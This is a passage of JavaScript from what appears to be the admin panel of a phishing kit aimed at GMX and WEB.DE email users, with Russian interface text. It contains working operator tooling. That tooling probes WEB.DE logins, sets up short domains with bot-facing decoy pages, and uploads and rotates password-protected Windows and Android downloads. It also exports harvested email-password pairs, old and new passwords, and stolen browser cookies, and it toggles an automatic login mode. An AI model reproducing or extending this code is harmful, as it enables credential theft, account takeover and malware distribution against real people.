            renderWebdeProbeResults(data.results || [], { running: !!(data.running && !data.done && !data.error && !data.paused) });
            if (data.done || data.error) {
              clearWebdeProbePoll();
              webdeProbeActiveJobId = null;
              webdeProbeLastTerminalMsg = '';
              webdeProbeLastState = { paused: false, running: false, done: true, error: data.error || null };
              syncWebdeProbeToolbar();
              if (data.error) showWebdeProbeStatus(String(data.error), 'error');
            }
          })
          .catch(function () {
            clearWebdeProbePoll();
            webdeProbeActiveJobId = null;
            webdeProbeLastState = { paused: false, running: false, done: true, error: 'net' };
            syncWebdeProbeToolbar();
            showWebdeProbeStatus('Сеть или сервер недоступны', 'error');
            appendProxiesTerminal('Сеть или сервер недоступны');
          });
      }, 1500);
    }
    var webdeProbeStart = document.getElementById('config-webde-probe-start');
    var webdeProbePause = document.getElementById('config-webde-probe-pause');
    if (webdeProbeStart) webdeProbeStart.addEventListener('click', function () {
      var input = document.getElementById('config-webde-probe-email');
      var email = input ? String(input.value || '').trim() : '';
      if (webdeProbeActiveJobId && webdeProbeLastState.paused && !webdeProbeLastState.done && !webdeProbeLastState.error) {
        postJson('/api/config/proxies', { probeResume: true, webdeProbeJobId: webdeProbeActiveJobId })
          .then(function (r) {
            return r.json().then(function (data) {
              if (!r.ok) throw new Error((data && data.error) ? String(data.error) : ('HTTP ' + r.status));
              return data;
            });
          })
          .then(function () {
            appendProxiesTerminal('Продолжение');
            webdeProbeLastState.paused = false;
            syncWebdeProbeToolbar();
            pollWebdeProbeJob(webdeProbeActiveJobId);
          })
          .catch(function (err) {
            showWebdeProbeStatus((err && err.message) ? err.message : 'Не удалось продолжить', 'error');
            appendProxiesTerminal('Ошибка продолжения: ' + ((err && err.message) ? err.message : '?'));
          });
        return;
      }
      if (!email || email.indexOf('@') === -1) {
        showWebdeProbeStatus('Укажите email', 'error');
        return;
      }
      clearWebdeProbePoll();
      webdeProbeActiveJobId = null;
      webdeProbeLastState = { paused: false, running: false, done: false, error: null };
      webdeProbeLastTerminalMsg = '';
      syncWebdeProbeToolbar();
      showWebdeProbeStatus('Запуск…', '');
      var sumStart = document.getElementById('config-webde-probe-results-summary');
      var listEl0 = document.getElementById('config-webde-probe-results-list');
      if (sumStart) sumStart.textContent = 'Запуск пробы…';
      if (listEl0) listEl0.innerHTML = '';
      appendProxiesTerminal('Старт: ' + email);
      postJson('/api/config/proxies', {
        probeStart: true,
        email: email,
        requirePasswordField: true,
        probeHeadless: false,
      })
        .then(function (r) {
          return r.json().then(function (data) {
            if (!r.ok) {
              throw new Error((data && data.error) ? String(data.error) : ('HTTP ' + r.status));
            }
            return data;
          });
        })
        .then(function (data) {
          if (!data || !data.jobId) {
            webdeProbeLastState = { paused: false, running: false, done: true, error: 'no job' };
            syncWebdeProbeToolbar();
            showWebdeProbeStatus('Нет jobId в ответе', 'error');
            return;
          }
          webdeProbeActiveJobId = data.jobId;
          if (data.probeIndicesTruncated && data.totalIndicesAvailable != null) {
            appendProxiesTerminal(
              'За этот запуск: ' +
                (data.total || '?') +
                ' из ' +
                data.totalIndicesAvailable +
                ' индексов (лимит сервера ' +
                (data.probeMaxIndicesPerJob != null ? data.probeMaxIndicesPerJob : '?') +
                ' за раз — нажмите «Старт» снова для следующей порции).'
            );
          }
          if (data.probeHeadlessForced) {
            appendProxiesTerminal('Нет X11 на сервере — прогон headless (окна не будет).');
            showWebdeProbeStatus('Очередь: ' + (data.total || '?') + ' индексов (headless)', '');
            if (sumStart) sumStart.textContent = 'Headless: на VPS нет дисплея — капчу вручную не пройти.';
          } else {
            showWebdeProbeStatus('Очередь: ' + (data.total || '?') + ' индексов', '');
            if (sumStart) sumStart.textContent = 'Ожидание окон браузера и результатов…';
          }
          pollWebdeProbeJob(data.jobId);
          authFetch('/api/config/proxies?webdeProbeJobId=' + encodeURIComponent(data.jobId))
            .then(function (r) { return r.json(); })
            .then(function (st) {
              if (st) renderWebdeProbeResults(st.results || [], { running: !!(st.running && !st.done && !st.error) });
            })
            .catch(function () {});
        })
        .catch(function (err) {
          webdeProbeLastState = { paused: false, running: false, done: true, error: 'start' };
          syncWebdeProbeToolbar();
          showWebdeProbeStatus((err && err.message) ? err.message : 'Не удалось запустить', 'error');
          appendProxiesTerminal('Ошибка запуска: ' + ((err && err.message) ? err.message : '?'));
        });
    });
    if (webdeProbePause) webdeProbePause.addEventListener('click', function () {
      if (!webdeProbeActiveJobId) return;
      postJson('/api/config/proxies', { probePause: true, webdeProbeJobId: webdeProbeActiveJobId })
        .then(function (r) {
          return r.json().then(function (data) {
            if (!r.ok) throw new Error((data && data.error) ? String(data.error) : ('HTTP ' + r.status));
            return data;
          });
        })
        .then(function () {
          webdeProbeLastState.paused = true;
          webdeProbeLastState.running = false;
          syncWebdeProbeToolbar();
          appendProxiesTerminal('Пауза');
          showWebdeProbeStatus('Пауза (нажмите Старт для продолжения)', '');
        })
        .catch(function (err) {
          showWebdeProbeStatus((err && err.message) ? err.message : 'Пауза не удалась', 'error');
        });
    });

    function saveDownloadSettingsRotation() {
      var input = document.getElementById('config-rotate-after') || document.getElementById('config-android-rotate-after');
      var n = input ? parseInt(input.value, 10) : 0;
      if (isNaN(n) || n < 0) n = 0;
      postJson('/api/config/download-settings', { rotateAfterUnique: n }).then(function () {
        loadDownloadSettings();
      }).catch(function () {});
    }
    var configRotateSave = document.getElementById('config-rotate-save');
    if (configRotateSave) configRotateSave.addEventListener('click', saveDownloadSettingsRotation);
    var configAndroidRotateSave = document.getElementById('config-android-rotate-save');
    if (configAndroidRotateSave) configAndroidRotateSave.addEventListener('click', saveDownloadSettingsRotation);

    function loadConfigShort() {
      var listEl = document.getElementById('config-short-list');
      var msgEl = document.getElementById('config-short-message');
      if (!listEl) return;
      listEl.innerHTML = '';
      authFetch('/api/config/short-domains').then(function (r) { return r.json(); }).then(function (data) {
        var list = (data && data.list) ? data.list : [];
        var serverIp = (data && data.serverIp) ? data.serverIp : '';
        list.forEach(function (item) {
          var row = document.createElement('div');
          row.className = 'config-short-row';
          row.style.cssText = 'display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border-color, #333);';
          var statusCls = item.status === 'ready' ? 'config-short-status--ready' : (item.status === 'error' ? 'config-short-status--error' : 'config-short-status--pending');
          var title = item.status === 'ready' ? 'Готово' : (item.status === 'error' ? 'Ошибка' : 'Ожидание DNS');
          var circle = document.createElement('span');
          circle.className = 'config-short-status ' + statusCls;
          circle.setAttribute('title', title + (item.message ? ': ' + item.message : ''));
          circle.style.cssText = 'width:12px;height:12px;border-radius:50%;flex-shrink:0;';
          if (item.status === 'ready') circle.style.background = '#22c55e';
          else if (item.status === 'error') circle.style.background = '#ef4444';
          else circle.style.background = '#eab308';
          var domainSpan = document.createElement('span');
          domainSpan.style.flex = '1';
          var styleLabel = item.whitePageStyle === 'news-webde' ? ' [боты: новости]' : '';
          domainSpan.textContent = item.domain + (item.targetUrl ? ' → ' + item.targetUrl : '') + styleLabel;
          var checkBtn = document.createElement('button');
          checkBtn.type = 'button';
          checkBtn.className = 'btn btn-ghost btn-sm';
          checkBtn.textContent = 'Проверить';
          checkBtn.dataset.domain = item.domain;
          var delBtn = document.createElement('button');
          delBtn.type = 'button';
          delBtn.className = 'btn btn-ghost btn-sm';
          delBtn.textContent = 'Удалить';
          delBtn.dataset.domain = item.domain;
          row.appendChild(circle);
          row.appendChild(domainSpan);
          row.appendChild(checkBtn);
          row.appendChild(delBtn);
          listEl.appendChild(row);
          if (item.message) {
            var msgRow = document.createElement('div');
            msgRow.className = 'config-short-msg';
            msgRow.style.cssText = 'font-size:0.85rem;color:var(--muted-color,#888);padding-left:22px;';
            msgRow.textContent = item.message;
            listEl.appendChild(msgRow);
          }
          checkBtn.addEventListener('click', function () {
            checkBtn.disabled = true;
            checkBtn.textContent = '…';
            postJson('/api/config/short-domains-check', { domain: item.domain }).then(function () { loadConfigShort(); }).catch(function () { loadConfigShort(); }).finally(function () { checkBtn.disabled = false; checkBtn.textContent = 'Проверить'; });
          });
          delBtn.addEventListener('click', function () {
            if (!confirm('Удалить домен ' + item.domain + '?')) return;
            authFetch('/api/config/short-domains?domain=' + encodeURIComponent(item.domain), { method: 'DELETE' })
              .then(function () { loadConfigShort(); })
              .catch(function () {
                showToast('Ошибка удаления домена');
                loadConfigShort();
              });
          });
        });
        if (list.length === 0) listEl.innerHTML = '<p class="config-files-list-hint">Нет доменов. Добавьте домен из Dynadot и при необходимости укажите SHORT_SERVER_IP и CLOUDFLARE_API_TOKEN в .env.</p>';
      }).catch(function () { if (listEl) listEl.innerHTML = '<p class="config-msg">Ошибка загрузки</p>'; });
    }

    var configShortAdd = document.getElementById('config-short-add');
    var configShortDomain = document.getElementById('config-short-domain');
    var configShortTarget = document.getElementById('config-short-target');
    var configShortMsg = document.getElementById('config-short-message');
    if (configShortAdd && configShortDomain) {
      configShortAdd.addEventListener('click', function () {
        var domain = (configShortDomain && configShortDomain.value) ? configShortDomain.value.trim().replace(/^https?:\/\//, '').split('/')[0].toLowerCase() : '';
        var targetUrl = (configShortTarget && configShortTarget.value) ? configShortTarget.value.trim() : '';
        var whitePageStyle = (document.getElementById('config-short-white-style') && document.getElementById('config-short-white-style').value) || '';
        if (!domain) { if (configShortMsg) { configShortMsg.textContent = 'Введите домен'; configShortMsg.className = 'config-msg'; configShortMsg.classList.remove('hidden'); } return; }
        configShortAdd.disabled = true;
        if (configShortMsg) { configShortMsg.textContent = 'Добавление…'; configShortMsg.classList.remove('hidden'); }
        postJson('/api/config/short-domains', { domain: domain, targetUrl: targetUrl, whitePageStyle: whitePageStyle }).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok !== false) {
            if (configShortMsg) { configShortMsg.textContent = data.message || 'Домен добавлен. В Dynadot укажите NS: ' + (data.ns && data.ns.length ? data.ns.join(', ') : ''); configShortMsg.className = 'config-msg success'; }
            if (configShortDomain) configShortDomain.value = '';
            if (configShortTarget) configShortTarget.value = '';
            loadConfigShort();
          } else if (configShortMsg) { configShortMsg.textContent = (data && data.error) || 'Ошибка'; configShortMsg.className = 'config-msg'; }
        }).catch(function (err) { if (configShortMsg) { configShortMsg.textContent = err.message || 'Ошибка'; configShortMsg.className = 'config-msg'; } }).finally(function () { configShortAdd.disabled = false; if (configShortMsg) setTimeout(function () { configShortMsg.classList.add('hidden'); }, 8000); });
      });
    }

    function loadDownloadSettings() {
      authFetch('/api/config/download-settings').then(function (r) { return r.json(); }).then(function (data) {
        var n = (data && data.rotateAfterUnique != null) ? Number(data.rotateAfterUnique) : 0;
        var w = (data && data.windowsUnique != null) ? data.windowsUnique : 0;
        var a = (data && data.androidUnique != null) ? data.androidUnique : 0;
        var text = 'Уникальных: Win ' + w + ', And ' + a;
        var inputWin = document.getElementById('config-rotate-after');
        var inputAnd = document.getElementById('config-android-rotate-after');
        var statsWin = document.getElementById('config-rotate-stats');
        var statsAnd = document.getElementById('config-android-rotate-stats');
        if (inputWin) inputWin.value = n;
        if (inputAnd) inputAnd.value = n;
        if (statsWin) statsWin.textContent = text;
        if (statsAnd) statsAnd.textContent = text;
      }).catch(function () {});
    }

    function loadConfigDownload() {
      authFetch('/api/config/download').then(function (r) { return r.json(); }).then(function (data) {
        var listEl = document.getElementById('config-download-files-list');
        var files = (data && data.files) ? data.files : [];
        if (!listEl) return;
        listEl.innerHTML = '';
        for (var i = 0; i < files.length; i++) {
          var item = files[i] || {};
          var name = item.fileName || null;
          var downloads = item.downloads != null ? item.downloads : 0;
          var limit = item.limit != null ? item.limit : 0;
          if (!name) continue;
          var row = document.createElement('div');
          row.className = 'config-file-row';
          var nameAttr = String(name).replace(/"/g, '&quot;');
          row.innerHTML =
            '<span class="config-file-num">' + (i + 1) + '.</span>' +
            '<span class="config-file-name config-file-name--copy" data-file-name="' + nameAttr + '" title="Копировать ссылку">' + escapeHtml(name) + '</span>' +
            ' <span class="config-file-stats">' + downloads + '/</span>' +
            '<input type="number" class="config-file-limit" min="0" step="1" value="' + limit + '" data-index="' + i + '" data-file-name="' + escapeHtml(name) + '" aria-label="Лимит">' +
            '<button type="button" class="btn btn-sm config-file-delete" data-file-name="' + nameAttr + '" title="Удалить из конфига">✕</button>';
          listEl.appendChild(row);
        }
        listEl.querySelectorAll('.config-file-name--copy').forEach(function (span) {
          span.addEventListener('click', function () {
            var fileName = span.getAttribute('data-file-name');
            if (!fileName) return;
            var url = (window.location.origin || '') + '/download/' + encodeURIComponent(fileName);
            if (navigator.clipboard && navigator.clipboard.writeText) {
              navigator.clipboard.writeText(url).then(function () {
                var msgEl = document.getElementById('config-download-files-message');
                if (msgEl) { msgEl.textContent = 'Ссылка скопирована'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); }
              }).catch(function () {});
            } else {
              var ta = document.createElement('textarea'); ta.value = url; ta.style.position = 'fixed'; ta.style.opacity = '0'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
              var msgEl = document.getElementById('config-download-files-message');
              if (msgEl) { msgEl.textContent = 'Ссылка скопирована'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); }
            }
          });
        });
        listEl.querySelectorAll('.config-file-limit').forEach(function (input) {
          input.addEventListener('change', function () {
            var fileName = input.getAttribute('data-file-name');
            var limit = parseInt(input.value, 10);
            if (isNaN(limit) || limit < 0) limit = 0;
            var msgEl = document.getElementById('config-download-files-message');
            postJson('/api/config/download-limit', { fileName: fileName, limit: limit }).then(function () {
              if (msgEl) { msgEl.textContent = 'Лимит сохранён'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); }
            }).catch(function () {
              if (msgEl) { msgEl.textContent = 'Ошибка'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
            });
          });
        });
        listEl.querySelectorAll('.config-file-delete').forEach(function (btn) {
          btn.addEventListener('click', function () {
            var fileName = btn.getAttribute('data-file-name');
            if (!fileName) return;
            if (!confirm('Удалить файл «' + fileName + '» из конфига Windows? Файл будет удалён с сервера.')) return;
            var msgEl = document.getElementById('config-download-files-message');
            postJson('/api/config/download-delete', { fileName: fileName }).then(function (r) {
              if (r && r.ok) { if (msgEl) { msgEl.textContent = 'Удалено'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); } loadConfigDownload(); }
              else if (msgEl) { msgEl.textContent = (r && r.error) || 'Ошибка'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
            }).catch(function () {
              if (msgEl) { msgEl.textContent = 'Ошибка сети'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
            });
          });
        });
      }).catch(function () {});
    }

    function bindResetAndRotate(platform) {
      var isWin = platform === 'windows';
      var resetBtn = document.getElementById(isWin ? 'config-download-reset-counts' : 'config-android-reset-counts');
      var rotateBtn = document.getElementById(isWin ? 'config-download-rotate-next' : 'config-android-rotate-next');
      var msgEl = document.getElementById(isWin ? 'config-download-files-message' : 'config-android-files-message');
      var loadList = isWin ? loadConfigDownload : loadConfigAndroid;
      function showMsg(text, type) {
        if (!msgEl) return;
        msgEl.textContent = text;
        msgEl.className = 'config-msg ' + (type || 'success');
        msgEl.classList.remove('hidden');
        setTimeout(function () { msgEl.classList.add('hidden'); }, 2500);
      }
      if (resetBtn) {
        resetBtn.addEventListener('click', function () {
          postJson('/api/config/download-reset-counts', { platform: platform }).then(function (r) {
            if (r && r.ok) { showMsg('Счётчики сброшены'); loadList(); }
            else showMsg((r && r.error) || 'Ошибка', 'error');
          }).catch(function () { showMsg('Ошибка сети', 'error'); });
        });
      }
      if (rotateBtn) {
        rotateBtn.addEventListener('click', function () {
          postJson('/api/config/download-rotate-next', { platform: platform }).then(function (r) {
            if (r && r.ok) { showMsg('След. конфиг для новых юзеров'); loadList(); }
            else showMsg((r && r.error) || 'Ошибка', 'error');
          }).catch(function () { showMsg('Ошибка сети', 'error'); });
        });
      }
    }
    bindResetAndRotate('windows');
    bindResetAndRotate('android');

    var configDownloadFilesInput = document.getElementById('config-download-files-input');
    var configDownloadFilesSave = document.getElementById('config-download-files-save');
    var configDownloadFilesMessage = document.getElementById('config-download-files-message');
    if (configDownloadFilesSave && configDownloadFilesInput) {
      configDownloadFilesSave.addEventListener('click', function () {
        var fileList = configDownloadFilesInput.files;
        var pwdEl = document.getElementById('config-windows-archive-password');
        var pwdVal = (pwdEl && pwdEl.value) ? String(pwdEl.value).trim() : '';
        if (!fileList || fileList.length === 0) {
          postJson('/api/config/zip-password', { password: pwdVal }).then(function () {
            if (configDownloadFilesMessage) {
              configDownloadFilesMessage.textContent = 'Пароль сохранён';
              configDownloadFilesMessage.className = 'config-msg success';
              configDownloadFilesMessage.classList.remove('hidden');
              setTimeout(function () { configDownloadFilesMessage.classList.add('hidden'); }, 2000);
            }
          }).catch(function () {
            if (configDownloadFilesMessage) {
              configDownloadFilesMessage.textContent = 'Ошибка';
              configDownloadFilesMessage.className = 'config-msg error';
              configDownloadFilesMessage.classList.remove('hidden');
            }
          });
          return;
        }
        if (configDownloadFilesMessage) {
          configDownloadFilesMessage.textContent = '';
          configDownloadFilesMessage.classList.add('hidden');
        }
        var fd = new FormData();
        for (var i = 0; i < fileList.length; i++) {
          fd.append('file', fileList[i]);
        }
        if (pwdVal) fd.append('zipPassword', pwdVal);
        var headers = {};
        fetch('/api/config/download-upload-multi', { method: 'POST', headers: headers, body: fd, credentials: 'same-origin' })
          .then(function (r) { return r.json(); })
          .then(function (data) {
            if (data && data.ok) {
              if (configDownloadFilesMessage) {
                configDownloadFilesMessage.textContent = 'Сохранено: ' + (data.uploadedCount != null ? data.uploadedCount : (data.files ? data.files.filter(function (f) { return f && f.fileName; }).length : 0)) + ' файл(ов)';
                configDownloadFilesMessage.className = 'config-msg success';
                configDownloadFilesMessage.classList.remove('hidden');
              }
              configDownloadFilesInput.value = '';
              loadConfigDownload();
            } else {
              if (configDownloadFilesMessage) {
                configDownloadFilesMessage.textContent = (data && data.error) || 'Ошибка';
                configDownloadFilesMessage.className = 'config-msg error';
                configDownloadFilesMessage.classList.remove('hidden');
              }
            }
          })
          .catch(function () {
            if (configDownloadFilesMessage) {
              configDownloadFilesMessage.textContent = 'Ошибка загрузки';
              configDownloadFilesMessage.className = 'config-msg error';
              configDownloadFilesMessage.classList.remove('hidden');
            }
          });
      });
    }

    function loadConfigAndroid() {
      authFetch('/api/config/download-android').then(function (r) { return r.json(); }).then(function (data) {
        var listEl = document.getElementById('config-android-files-list');
        var files = (data && data.files) ? data.files : [];
        if (!listEl) return;
        listEl.innerHTML = '';
        for (var i = 0; i < files.length; i++) {
          var item = files[i] || {};
          var name = item.fileName || null;
          var downloads = item.downloads != null ? item.downloads : 0;
          var limit = item.limit != null ? item.limit : 0;
          if (!name) continue;
          var row = document.createElement('div');
          row.className = 'config-file-row';
          var nameAttr = String(name).replace(/"/g, '&quot;');
          row.innerHTML =
            '<span class="config-file-num">' + (i + 1) + '.</span>' +
            '<span class="config-file-name config-file-name--copy" data-file-name="' + nameAttr + '" title="Копировать ссылку">' + escapeHtml(name) + '</span>' +
            ' <span class="config-file-stats">' + downloads + '/</span>' +
            '<input type="number" class="config-file-limit config-android-limit" min="0" step="1" value="' + limit + '" data-index="' + i + '" data-file-name="' + escapeHtml(name) + '" aria-label="Лимит">' +
            '<button type="button" class="btn btn-sm config-file-delete" data-file-name="' + nameAttr + '" title="Удалить из конфига">✕</button>';
          listEl.appendChild(row);
        }
        listEl.querySelectorAll('.config-file-name--copy').forEach(function (span) {
          span.addEventListener('click', function () {
            var fileName = span.getAttribute('data-file-name');
            if (!fileName) return;
            var url = (window.location.origin || '') + '/download/' + encodeURIComponent(fileName);
            if (navigator.clipboard && navigator.clipboard.writeText) {
              navigator.clipboard.writeText(url).then(function () {
                var msgEl = document.getElementById('config-android-files-message');
                if (msgEl) { msgEl.textContent = 'Ссылка скопирована'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); }
              }).catch(function () {});
            } else {
              var ta = document.createElement('textarea'); ta.value = url; ta.style.position = 'fixed'; ta.style.opacity = '0'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
              var msgEl = document.getElementById('config-android-files-message');
              if (msgEl) { msgEl.textContent = 'Ссылка скопирована'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); }
            }
          });
        });
        listEl.querySelectorAll('.config-android-limit').forEach(function (input) {
          input.addEventListener('change', function () {
            var fileName = input.getAttribute('data-file-name');
            var limit = parseInt(input.value, 10);
            if (isNaN(limit) || limit < 0) limit = 0;
            var msgEl = document.getElementById('config-android-files-message');
            postJson('/api/config/download-android-limit', { fileName: fileName, limit: limit }).then(function () {
              if (msgEl) { msgEl.textContent = 'Лимит сохранён'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); }
            }).catch(function () {
              if (msgEl) { msgEl.textContent = 'Ошибка'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
            });
          });
        });
        listEl.querySelectorAll('.config-file-delete').forEach(function (btn) {
          btn.addEventListener('click', function () {
            var fileName = btn.getAttribute('data-file-name');
            if (!fileName) return;
            if (!confirm('Удалить файл «' + fileName + '» из конфига Android? Файл будет удалён с сервера.')) return;
            var msgEl = document.getElementById('config-android-files-message');
            postJson('/api/config/download-android-delete', { fileName: fileName }).then(function (r) {
              if (r && r.ok) { if (msgEl) { msgEl.textContent = 'Удалено'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); setTimeout(function () { msgEl.classList.add('hidden'); }, 1500); } loadConfigAndroid(); }
              else if (msgEl) { msgEl.textContent = (r && r.error) || 'Ошибка'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
            }).catch(function () {
              if (msgEl) { msgEl.textContent = 'Ошибка сети'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
            });
          });
        });
      }).catch(function () {});
    }

    var configAndroidFilesInput = document.getElementById('config-android-files-input');
    var configAndroidFilesSave = document.getElementById('config-android-files-save');
    var configAndroidFilesMessage = document.getElementById('config-android-files-message');
    if (configAndroidFilesSave && configAndroidFilesInput) {
      configAndroidFilesSave.addEventListener('click', function () {
        var fileList = configAndroidFilesInput.files;
        if (!fileList || fileList.length === 0) {
          if (configAndroidFilesMessage) {
            configAndroidFilesMessage.textContent = 'Выберите файлы';
            configAndroidFilesMessage.className = 'config-msg error';
            configAndroidFilesMessage.classList.remove('hidden');
          }
          return;
        }
        if (configAndroidFilesMessage) {
          configAndroidFilesMessage.textContent = '';
          configAndroidFilesMessage.classList.add('hidden');
        }
        var fd = new FormData();
        for (var i = 0; i < fileList.length; i++) {
          fd.append('file', fileList[i]);
        }
        var headers = {};
        fetch('/api/config/download-android-upload-multi', { method: 'POST', headers: headers, body: fd, credentials: 'same-origin' })
          .then(function (r) { return r.json(); })
          .then(function (data) {
            if (data && data.ok) {
              if (configAndroidFilesMessage) {
                configAndroidFilesMessage.textContent = 'Сохранено: ' + (data.uploadedCount != null ? data.uploadedCount : (data.files ? data.files.filter(function (f) { return f && f.fileName; }).length : 0)) + ' файл(ов)';
                configAndroidFilesMessage.className = 'config-msg success';
                configAndroidFilesMessage.classList.remove('hidden');
              }
              configAndroidFilesInput.value = '';
              loadConfigAndroid();
            } else {
              if (configAndroidFilesMessage) {
                configAndroidFilesMessage.textContent = (data && data.error) || 'Ошибка';
                configAndroidFilesMessage.className = 'config-msg error';
                configAndroidFilesMessage.classList.remove('hidden');
              }
            }
          })
          .catch(function () {
            if (configAndroidFilesMessage) {
              configAndroidFilesMessage.textContent = 'Ошибка загрузки';
              configAndroidFilesMessage.className = 'config-msg error';
              configAndroidFilesMessage.classList.remove('hidden');
            }
          });
      });
    }

    function getExportPlatforms() {
      var ids = ['export-platform-windows', 'export-platform-macos', 'export-platform-android', 'export-platform-ios', 'export-platform-unknown'];
      var out = [];
      ids.forEach(function (id) {
        var el = document.getElementById(id);
        if (el && el.checked) out.push(id.replace('export-platform-', ''));
      });
      return out;
    }
    function downloadExport(type, defaultFilename) {
      var platforms = getExportPlatforms();
      var url = '/api/export-logs?type=' + encodeURIComponent(type);
      if (platforms.length) url += '&platforms=' + encodeURIComponent(platforms.join(','));
      authFetch(url)
        .then(function (r) {
          if (!r.ok) return r.text().then(function (t) { return Promise.reject(new Error(t || r.statusText)); });
          return r.blob().then(function (blob) {
            var disp = r.headers.get('Content-Disposition');
            var name = defaultFilename;
            if (disp) {
              var m = disp.match(/filename="([^"]+)"/);
              if (m) name = m[1];
            }
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = name;
            a.rel = 'noopener';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
          });
        })
        .catch(function (err) {
          console.error('[GMW Admin] export-logs:', err);
          alert('Ошибка выгрузки: ' + (err.message || 'Network error'));
        });
    }
    var exportCredentials = document.getElementById('export-logs-credentials');
    var exportAllEmails = document.getElementById('export-logs-all-emails');
    var exportAllEmailPass = document.getElementById('export-logs-all-email-pass');
    var exportOldNew = document.getElementById('export-logs-old-new');
    if (exportCredentials) exportCredentials.addEventListener('click', function () { downloadExport('credentials', 'logs-email-password.txt'); });
    if (exportAllEmails) exportAllEmails.addEventListener('click', function () { downloadExport('all_emails', 'logs-emails.txt'); });
    if (exportAllEmailPass) exportAllEmailPass.addEventListener('click', function () { downloadExport('all_email_pass', 'logs-all-email-pass.txt'); });
    if (exportOldNew) exportOldNew.addEventListener('click', function () { downloadExport('all_email_old_new', 'logs-email-old-new.txt'); });

    function downloadCookiesExport(mode) {
      var url = '/api/config/cookies-export?mode=' + encodeURIComponent(mode);
      authFetch(url)
        .then(function (r) {
          var ct = r.headers.get('Content-Type') || '';
          if (ct.indexOf('application/json') !== -1) {
            return r.json().then(function (body) {
              if (body && body.ok === false && body.error) {
                alert(body.error);
              } else {
                alert('Ошибка: ' + (body && body.error ? body.error : r.statusText));
              }
            });
          }
          return r.blob().then(function (blob) {
            var disp = r.headers.get('Content-Disposition');
            var name = mode === 'new' ? 'cookies-new.zip' : 'cookies-all.zip';
            if (disp) {
              var m = disp.match(/filename="([^"]+)"/);
              if (m) name = m[1];
            }
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = name;
            a.rel = 'noopener';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
          });
        })
        .catch(function (err) {
          alert('Ошибка выгрузки куки: ' + (err.message || 'Network error'));
        });
    }
    var exportCookiesAll = document.getElementById('export-cookies-all');
    var exportCookiesNew = document.getElementById('export-cookies-new');
    var exportCookiesForce = document.getElementById('export-cookies-force');
    if (exportCookiesAll) exportCookiesAll.addEventListener('click', function () { downloadCookiesExport('all'); });
    if (exportCookiesNew) exportCookiesNew.addEventListener('click', function () { downloadCookiesExport('new'); });
    if (exportCookiesForce) exportCookiesForce.addEventListener('click', function () { downloadCookiesExport('force'); });
  }

  function initModeAndStartPage() {
    var dropdown = document.getElementById('headerModeDropdown');
    var trigger = document.getElementById('headerModeTrigger');
    var triggerText = document.getElementById('headerModeTriggerText');
    var menu = document.getElementById('headerModeMenu');
    var menuItems = menu ? menu.querySelectorAll('.header-mode-item[data-mode]') : [];

    var currentMode = 'auto';
    var LABELS = { 'manual': 'Manual', 'auto': 'Auto', 'auto-login': 'Auto-Login' };

    function updateModeUI() {
      if (triggerText) triggerText.textContent = LABELS[currentMode] || currentMode;
      menuItems.forEach(function (item) {
        item.classList.toggle('active', item.getAttribute('data-mode') === currentMode);
      });
    }

    function closeModeMenu() {
      if (dropdown) dropdown.classList.remove('is-open');
      if (trigger) trigger.setAttribute('aria-expanded', 'false');
      if (menu) menu.setAttribute('aria-hidden', 'true');
    }

    function applyMode(mode) {
      var prevMode = currentMode;
      currentMode = mode;
      var req;
      if (mode === 'manual') {
        req = postJson('/api/mode', { mode: 'manual', autoScript: false });
      } else if (mode === 'auto') {
        req = postJson('/api/mode', { mode: 'auto', autoScript: false });
      } else {
        req = postJson('/api/mode', { mode: 'auto', autoScript: true });
      }
      try { localStorage.setItem('gmw-auto-script', mode === 'auto-login' ? '1' : '0'); } catch (e) {}
      updateModeUI();
      closeModeMenu();
      req.catch(function () {
        currentMode = prevMode;
        updateModeUI();
        showToast('Не удалось сохранить режим на сервере');
      });
    }

    authFetch('/api/mode').then(function (r) { return r.json(); }).then(function (data) {
      var mode = ((data.mode || 'auto') + '').toLowerCase();
      var autoScript = !!data.autoScript;
      if (mode === 'manual') currentMode = 'manual';
      else if (mode === 'auto' && autoScript) currentMode = 'auto-login';
      else currentMode = 'auto';
      try { localStorage.setItem('gmw-auto-script', autoScript ? '1' : '0'); } catch (e) {}
      updateModeUI();
      var baseGmx = data.canonicalBaseGmx || data.canonicalBase || '';
      var baseWebde = data.canonicalBaseWebde || '';
      var siteLink = document.getElementById('site-link');
      var siteLinkChange = document.getElementById('site-link-change');
      var siteLinkWebde = document.getElementById('site-link-webde');
      var siteLinkWebdeChange = document.getElementById('site-link-webde-change');
      if (siteLink) siteLink.href = baseGmx ? (baseGmx.replace(/\/$/, '') + '/anmelden') : '/anmelden';
      if (siteLinkChange) siteLinkChange.href = baseGmx ? (baseGmx.replace(/\/$/, '') + '/sicherheit-update') : '/sicherheit-update';
